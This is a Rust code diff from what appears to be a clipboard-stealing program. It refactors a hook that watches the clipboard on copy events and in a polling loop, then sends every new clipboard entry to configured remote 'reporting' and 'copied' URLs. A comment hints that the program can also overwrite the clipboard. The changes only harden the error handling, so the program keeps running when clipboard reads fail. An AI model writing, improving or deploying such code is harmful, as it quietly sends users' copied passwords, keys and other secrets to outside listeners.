@@ -13,19 +13,30 @@ pub fn register_clipboard_hook(wait_time: Duration, reporting_urls: Vec<String>)
         //Wait until the system has copied the text to the clipboard
         thread::sleep(Duration::from_millis(64));
 
-        let clipboard_contents = read_clipboard();
-
-        //Send the clipboard contents to the listeners
-        transmit_clipboard(clipboard_contents, reporting_urls.clone());
+        match read_clipboard() {
+            Ok(content) => {
+                //Send the clipboard contents to the listeners
+                transmit_clipboard(content, &reporting_urls);
+            }
+            Err(e) => {
+                println!("{}", e);
+            }
+        }
     });
 
-    let mut old_clipboard_contents = read_clipboard();
-    thread::spawn(move || loop {
-        let clipboard_contents = read_clipboard();
+    let mut old_clipboard_contents = read_clipboard().unwrap_or(".".into());
 
-        if clipboard_contents != old_clipboard_contents {
-            old_clipboard_contents = clipboard_contents.clone();
-            transmit_clipboard(clipboard_contents, copied_urls.clone());
+    thread::spawn(move || loop {
+        match read_clipboard() {
+            Ok(content) => {
+                if content != old_clipboard_contents {
+                    old_clipboard_contents = content.clone();
+                    transmit_clipboard(content, &copied_urls);
+                }
+            }
+            Err(e) => {
+                println!("{}", e);
+            }
         }
 
         thread::sleep(wait_time);
@@ -33,9 +44,13 @@ pub fn register_clipboard_hook(wait_time: Duration, reporting_urls: Vec<String>)
 }
 
 // Extract the clipboard contents
-pub fn read_clipboard() -> String {
+pub fn read_clipboard() -> Result<String, &'static str> {
     let mut ctx = ClipboardContext::new().unwrap();
-    ctx.get_contents().unwrap_or(String::from("."))
+
+    match ctx.get_contents() {
+        Ok(contents) => Ok(contents),
+        Err(_) => Err("Failed to read clipboard contents"),
+    }
 }
 
 // Update the clipboard contents
